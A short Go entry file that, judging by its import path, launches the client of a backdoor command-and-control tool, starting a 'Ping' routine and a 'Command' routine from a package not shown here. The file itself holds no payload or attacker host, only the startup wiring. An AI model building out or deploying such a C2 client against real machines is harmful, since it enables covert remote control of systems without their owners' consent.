package main

import "go-sec/backdoor/command-control/client/util"

func main() {
	go util.Ping()
	util.Command()
}